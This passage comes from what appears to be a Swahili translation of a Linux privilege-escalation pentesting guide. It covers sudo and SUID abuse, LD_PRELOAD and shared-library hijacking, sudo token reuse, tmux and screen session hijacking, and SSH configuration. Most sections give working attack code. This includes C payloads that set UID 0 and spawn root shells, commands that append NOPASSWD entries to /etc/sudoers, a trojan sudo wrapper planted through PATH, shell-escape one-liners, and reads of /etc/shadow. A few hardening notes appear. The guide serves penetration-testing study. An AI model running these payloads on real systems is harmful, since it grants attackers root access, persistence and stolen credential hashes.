Ikiwa unagundua kwamba unaweza kutumia amri ya **`runc`** soma ukurasa ufuatao kwa sababu **huenda ukaweza kuipeleka kwa matumizi ili kuongeza privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo tata wa **inter-Process Communication (IPC)** unaowezesha applications kuingiliana na kushirikiana data kwa ufanisi. Umebuniwa kwa mfumo wa kisasa wa Linux, na hutoa mfumo thabiti kwa aina mbalimbali za mawasiliano ya application.

Mfumo ni mwepesi, ukiunga mkono IPC ya msingi inayoboreshwa kubadilishana data kati ya process, kama vile **enhanced UNIX domain sockets**. Zaidi ya hapo, husaidia katika kutangaza matukio au signals, kukuza uunganishaji rahisi kati ya vipengele vya mfumo. Kwa mfano, signali kutoka kwa Bluetooth daemon kuhusu simu inayokuja inaweza kusababisha music player kutuliza sauti, kuboresha uzoefu wa mtumiaji. Aidha, D-Bus inasaidia mfumo wa remote object, kurahisisha maombi ya service na kuitisha methods kati ya applications, kufanya michakato iliyokuwa ngumu kuwa rahisi.

D-Bus inafanya kazi kwa mtiririko wa **allow/deny model**, ikisimamia ruhusa za ujumbe (method calls, signal emissions, n.k.) kutokana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinafafanua mwingiliano na bus, na zinaweza kuruhusu escalation ya privileges kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukielezea ruhusa za user root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera ambazo hazina user au group zilizobainishwa zinatumika kwa wote, wakati sera za muktadha "default" zinatumika kwa wale wote wasiopatikana chini ya sera maalum zingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate and exploit a D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima ni vya kuvutia enumerate the network na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Daima angalia network services zinazofanya kazi kwenye mashine ambazo haukuweza kuingiliana nazo kabla ya kupata ufikiaji:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia kama unaweza sniff traffic. Ikiwa ndiyo, unaweza kupata credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Kagua ni **who** wewe ni, ni **privileges** zipi ulizonazo, ni **users** gani wapo kwenye mifumo, ni zipi zinaweza **login** na ni zipi zina **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya toleo za Linux zilikuwa zikiathiriwa na mdudu unaowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha ruhusa. Taarifa zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Kagua kama wewe ni **mwanachama wa kikundi fulani** ambacho kinaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao la kunakili

Angalia kama kuna kitu chochote cha kuvutia kilichopo ndani ya ubao la kunakili (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zilizojulikana

Ikiwa unajua **nywila yoyote** ya mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa haufikiri shida kuhusu kusababisha kelele nyingi na `su` na `timeout` binaries ziko kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa kigezo `-a` pia hujaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa unagundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH**, huenda ukaweza kuinua ruhusa kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri itakayotekelezwa na mtumiaji mwingine (root, kwa kawaida) na ambayo **haitapakiwa kutoka kwenye folda iliyopo kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani ukitumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`; sasa ni rahisi kupata shell kwa kuongeza ssh key katika root directory au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Kielekezo hiki kinamwezesha mtumiaji **kuweka kigezo cha mazingira** wakati anatekeleza jambo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **based on HTB machine Admirer**, ulikuwa **vulnerable** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikitekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Iwapo sudoers inahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya uanzishaji isiyo ya mwingiliano ya Bash kuendesha code yoyote kama root wakati wa kuwaita amri inayoruhusiwa.

- Kwa nini inafanya kazi: Kwa shells zisizo za mwingiliano, Bash hutathmini `$BASH_ENV` na ina-source faili hiyo kabla ya kuendesha script lengwa. Sera nyingi za sudo zinaruhusu kuendesha script au wrapper ya shell. Ikiwa `BASH_ENV` imetunzwa na sudo, faili yako ita-source na vibali vya root.

- Mahitaji:
- Sera ya sudo unayoweza kuendesha (lengo lolote linaloitisha `/bin/bash` bila mwingiliano, au script yoyote ya bash).
- `BASH_ENV` kuwepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, tumia `env_reset`.
- Epuka shell wrappers kwa amri zilizoruhusiwa na sudo; tumia minimal binaries.
- Fikiria sudo I/O logging na alerting wakati preserved env vars zinapotumika.

### Sudo execution bypassing paths

**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), ni hata rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila kuainisha njia ya amri

Kama **sudo permission** imetolewa kwa amri moja tu **bila kuainisha njia**: _hacker10 ALL= (root) less_ unaweza exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa **suid** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary na command path

Ikiwa **suid** binary **executes another command specifying the path**, basi unaweza kujaribu **export a function** yenye jina la amri ambayo suid file inaiita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function hiyo na kuiexport:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoitisha binary ya suid, kazi hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable inatumika kutaja moja au zaidi ya shared libraries (.so files) zitakazopakiwa na loader kabla ya nyingine zote, ikiwa ni pamoja na standard C library (`libc.so`). Mchakato huu unajulikana kama ku-preload maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwenye executables za **suid/sgid**, mfumo unaweka masharti fulani:

- Loader haitazingatia **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haolingani na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba zilizoko katika njia za kawaida ambazo pia ni suid/sgid tu ndizo zitakazopakiwa kabla.

Kuongezeka kwa ruhusa kunaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Usanidi huu unawezesha variable ya mazingira **LD_PRELOAD** kudumu na kutambulika hata wakati amri zinapoendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezaji wa msimbo wowote kwa ruhusa zilizoongezwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** ukitumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** zinaendeshwa
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH** kwa sababu yeye anadhibiti njia ambapo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** zinazoonekana isizo za kawaida, ni mazoea mazuri kuthibitisha kama inapakia faili za **.so** kwa usahihi. Hii inaweza kuchunguzwa kwa kukimbiza amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunapendekeza uwezekano wa exploitation.

Ili kufanya exploit ya hili, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, iliyo na msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Mara tu code hii itakapokompailiwa na kutekelezwa, inalenga kuinua ruhusa kwa kubadili ruhusa za faili na kutekeleza shell yenye ruhusa za juu.

Kompaila faili ya C iliyo juu kuwa shared object (.so) kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kukimbia SUID binary iliyoathiriwa kunapaswa kuanzisha exploit, kuruhusu uwezekano wa kuingiliwa kwa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumeona SUID binary inayo-pakia library kutoka kwenye folder tunaoweza kuandika; tuunde library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kuwa maktaba uliyoitengeneza inapaswa kuwa na function iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo mdundozi anaweza kutumia kupita vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **kuingiza arguments tu** katika command.

Mradi unakusanya functions halali za Unix binaries ambazo zinaweza kutumika kutoroka restricted shells, kuinua au kudumisha privileges zilizoinuliwa, kuhamisha faili, kuanzisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Kama unaweza kufikia `sudo -l` unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kukagua kama inapata njia ya ku-exploit sheria yoyote ya sudo.

### Kutumia tena sudo tokens

Katika kesi ambapo una **sudo access** lakini sio nenosiri, unaweza kuinua privileges kwa **kusubiri utekelezaji wa command ya sudo kisha ku-hijack session token**.

Mahitaji ya kuinua privileges:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa chaguo-msingi huo ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza nenosiri)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kui-upload)

(Unaweza kuwasha kwa muda `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yamekidhiwa, **unaweza kuinua privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuamsha sudo token katika session yako** (hautapata root shell kiotomatiki, tumia `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- The **second exploit** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **iliyomilikiwa na root na yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) itatengeneza **sudoers file** ambayo inafanya **sudo tokens kuwa za milele na inaruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye yoyote ya mafaili yaliyoundwa ndani ya folda, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ku **unda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata idhini za sudo** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizopo ndani ya `/etc/sudoers.d` zinaweka ni nani anaweza kutumia `sudo` na jinsi. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na user root na group root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata baadhi ya taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kupandisha ruhusa**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa binary ya `sudo` kama `doas` ya OpenBSD; kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

If you know that a **user usually connects to a machine and uses `sudo`** to escalate privileges and you got a shell within that user context, you can **create a new sudo executable** that will execute your code as root and then the user's command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **wapi faili za usanidi zilizosomwa zinatoka**. Kwa kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii ina maana kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaelekeza kwenye folda nyingine** ambapo **libraries** zitatafutwa. Kwa mfano, yaliyomo katika `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii ina maana mfumo utatafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa za kuandika** kwenye mojawapo ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili za usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa escalate privileges.\
Angalia **jinsi ya kutumia usanidi usio sahihi huu** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib katika `/var/tmp/flag15/`, itatumiwa na programu katika eneo hili kama ilivyoainishwa katika kigezo `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha tengeneza maktaba ya uadui kwenye `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities hutoa **sehemu ndogo ya vibali vya root vinavyopatikana kwa mchakato**. Hii kwa ufanisi inavunjavunja vibali vya root **kuwa vitengo vidogo na tofauti**. Kila mojawapo ya vitengo hivi inaweza kisha kutolewa kwa mchakato binafsi. Kwa njia hii seti kamili ya vibali inapunguzwa, kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za Katalogi

Kwenye katalogi, **bit ya "execute"** inaashiria kuwa mtumiaji anayehusika anaweza "**cd**" ndani ya folda.\
**"read"** bit inaashiria mtumiaji anaweza **kuorodhesha** **files**, na **"write"** bit inaashiria mtumiaji anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha tabaka la pili la vibali vya hiari, zenye uwezo wa **kupita permissions za jadi za ugo/rwx**. Vibali hivi vinaboresha udhibiti wa upatikanaji wa file au directory kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao sio wamiliki au sehemu ya kundi. Kiwango hiki cha **granularity kinahakikisha usimamizi wa upatikanaji kwa usahihi zaidi**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zilizo na ACL maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session ya mtumiaji mwingine (**root**).\
Katika **matoleo mapya** utaweza **connect** kwenye screen sessions tu za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **maelezo ya kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo na **old tmux versions**. Sikuweza hijack a tmux (v2.1) session iliyoundwa na root kama non-privileged user.
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vilivyotengenezwa kwenye mifumo inayotokana na Debian (Ubuntu, Kubuntu, n.k.) kati ya Septemba 2006 na Mei 13, 2008 vinaweza kuathiriwa na mdudu huu.\
Mdudu huu hutokana na kuunda ssh key mpya katika OS hizo, kwani **matofauti 32,768 tu ndiyo yangekuwa yanayowezekana**. Hii ina maana kwamba uwezekano wote unaweza kuhesabiwa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano zilizohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Vigezo muhimu vya usanidi

- **PasswordAuthentication:** Inaeleza ikiwa uthibitishaji kwa nywila unaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaeleza ikiwa public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati uthibitishaji kwa nywila ukiruhusiwa, inaeleza kama server inaruhusu kuingia kwenye akaunti zenye nywila tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia kwa private key pekee
- `forced-commands-only`: Root anaweza kuingia kwa private key pekee na endapo options za commands zimeelezwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza faili ambazo zina public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, zitakazobadilishwa na home directory. **Unaweza taja absolute paths** (anza kwa `/`) au **relative paths kutoka home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Usanidi huo utaonyesha kwamba ikiwa utajaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizoko katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye server yako. Hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko kwenye **initial host** yako.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anapoenda kwenye mashine tofauti, host hiyo itaweza kupata keys (ambayo ni suala la usalama).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili za Kuvutia

### Faili za profile

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripti zinazotekelezwa wakati mtumiaji anapoendesha shell mpya**. Therefore, if you can **kuandika au kubadilisha yeyote kati yao unaweza escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script ya profile isiyo ya kawaida inapatikana unapaswa kuichunguza kwa **maelezo nyeti**.

### Passwd/Shadow Files

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zikitumia jina tofauti au kunaweza kuwa na chelezo. Kwa hivyo inashauriwa **tafuta zote** na **angalia kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
